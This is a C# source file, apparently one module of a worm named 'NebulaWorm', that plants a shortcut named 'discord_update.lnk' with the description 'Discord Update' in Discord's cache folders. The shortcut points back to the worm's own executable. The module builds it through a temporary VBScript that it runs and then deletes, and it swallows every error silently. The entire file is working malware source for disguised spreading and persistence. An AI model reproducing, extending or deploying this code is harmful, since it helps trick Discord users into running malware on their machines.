using System;
using System.IO;
using System.Diagnostics;

namespace NebulaWorm
{
    internal static class Discord
    {
        private static readonly string[] DiscordCacheFolders = new[]
        {
            "Cache",
            "Code Cache\\js",
            "IndexedDB",
            "Local Storage"
        };

        public static void PoisonCache()
        {
            try
            {
                string discordPath = GetDiscordLocalAppDataPath();
                if (discordPath == null)
                    return;

                string exePath = Process.GetCurrentProcess().MainModule.FileName;

                foreach (string subfolder in DiscordCacheFolders)
                {
                    string targetFolder = Path.Combine(discordPath, subfolder);
                    if (!Directory.Exists(targetFolder)) continue;

                    CreateMaliciousShortcut(targetFolder, exePath);
                }
            }
            catch { }
        }

        private static string GetDiscordLocalAppDataPath()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            string discordPath = Path.Combine(appData, "Discord");

            if (Directory.Exists(discordPath))
            {
                return discordPath;
            }

            return null;
        }

        private static void CreateMaliciousShortcut(string folderPath, string targetExe)
        {
            try
            {
                string shortcutPath = Path.Combine(folderPath, "discord_update.lnk");
                if (File.Exists(shortcutPath))
                    return;

                string vbs = $@"
Set oWS = WScript.CreateObject(""WScript.Shell"")
Set oLink = oWS.CreateShortcut(""{shortcutPath}"")
oLink.TargetPath = ""{targetExe}""
oLink.WorkingDirectory = ""{Path.GetDirectoryName(targetExe)}""
oLink.WindowStyle = 1
oLink.Description = ""Discord Update""
oLink.Save
";
                string tempVbs = Path.Combine(Path.GetTempPath(), "temp_" + Guid.NewGuid().ToString("N") + ".vbs");
                File.WriteAllText(tempVbs, vbs);

                Process.Start("wscript", $"\"{tempVbs}\"");
                System.Threading.Thread.Sleep(300);
                File.Delete(tempVbs);
            }
            catch { }
        }
    }
}
